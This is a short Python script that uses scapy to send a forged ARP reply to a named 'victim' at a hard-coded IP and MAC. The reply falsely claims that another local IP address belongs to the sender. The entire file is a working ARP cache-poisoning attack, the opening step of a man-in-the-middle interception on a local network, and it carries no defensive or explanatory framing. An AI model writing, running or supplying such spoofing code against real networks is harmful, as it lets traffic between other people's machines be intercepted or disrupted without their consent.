from scapy.all import *

def arpResponse():
    arp_response = ARP()
    # call the spoof function with arp_response as an arg
    spoofVictim(arp_response)

# function defincation and victim IP and MAC manipulation

def spoofVictim(arp_response):
    #print(arp_response.show())
    arp_response.op = 2
    arp_response.pdst = "192.168.100.94"
    arp_response.hwdst = "b4:2e:99:5f:a3:e9"
    arp_response.hwsrc = "f8:89:d2:ec:03:5d"
    arp_response.psrc = "192.168.100.21"
    send(arp_response)

if __name__ == '__main__':
    arpResponse()